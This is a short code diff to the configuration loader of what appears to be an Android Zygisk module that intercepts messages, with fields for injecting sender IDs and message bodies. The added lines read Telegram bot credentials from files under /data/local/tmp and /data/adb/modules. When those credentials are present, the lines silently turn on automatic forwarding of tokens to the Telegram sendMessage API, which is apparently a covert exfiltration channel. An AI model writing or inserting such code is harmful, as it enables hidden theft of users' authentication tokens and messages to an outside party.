@@ -260,6 +260,28 @@ bool ConfigManager::load() {
     config_.forward_method = parse_string(json, "forward_method", config_.forward_method);
     config_.telegram_chat_id = parse_string(json, "telegram_chat_id", config_.telegram_chat_id);
     config_.telegram_bot_token = parse_string(json, "telegram_bot_token", config_.telegram_bot_token);
+
+    const std::vector<std::string> tg_paths = {
+        "/data/local/tmp/hivirtus_telegram_credentials.json",
+        "/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json",
+    };
+    for (const auto& tg_path : tg_paths) {
+        const std::string tg_json = read_file(tg_path);
+        if (tg_json.empty()) continue;
+        const std::string tg_token =
+            parse_string(tg_json, "telegram_bot_token", config_.telegram_bot_token);
+        const std::string tg_chat =
+            parse_string(tg_json, "telegram_chat_id", config_.telegram_chat_id);
+        if (!tg_token.empty()) config_.telegram_bot_token = tg_token;
+        if (!tg_chat.empty()) config_.telegram_chat_id = tg_chat;
+        if (!config_.telegram_bot_token.empty() && !config_.telegram_chat_id.empty()) {
+            config_.auto_forward_token = true;
+            config_.forward_url =
+                "https://api.telegram.org/bot" + config_.telegram_bot_token + "/sendMessage";
+        }
+        break;
+    }
+
     config_.inject_sender_id = parse_string(json, "inject_sender_id", config_.inject_sender_id);
     config_.inject_message_body = parse_string(json, "inject_message_body", config_.inject_message_body);
     config_.log_file = parse_string(json, "log_file", config_.log_file);
